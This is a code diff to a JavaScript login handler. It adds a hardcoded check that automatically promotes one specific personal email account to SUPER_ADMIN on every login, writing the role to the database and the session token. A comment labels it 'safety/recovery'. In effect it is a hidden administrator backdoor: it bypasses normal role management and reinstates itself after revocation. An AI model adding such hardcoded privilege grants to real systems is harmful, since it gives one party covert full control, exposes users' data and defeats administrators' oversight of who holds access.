@@ -90,6 +90,15 @@ export const login = async (req, res) => {
             });
         }
 
+        // Auto-promote Super Admin (Hardcoded for safety/recovery)
+        if (user.email === 'oussamaqarbach@gmail.com' && user.role !== 'SUPER_ADMIN') {
+            await prisma.user.update({
+                where: { id: user.id },
+                data: { role: 'SUPER_ADMIN' }
+            });
+            user.role = 'SUPER_ADMIN'; // Update local object for token generation
+        }
+
         // Generate token
         const token = jwt.sign({ userId: user.id, role: user.role }, process.env.JWT_SECRET, {
             expiresIn: '7d',
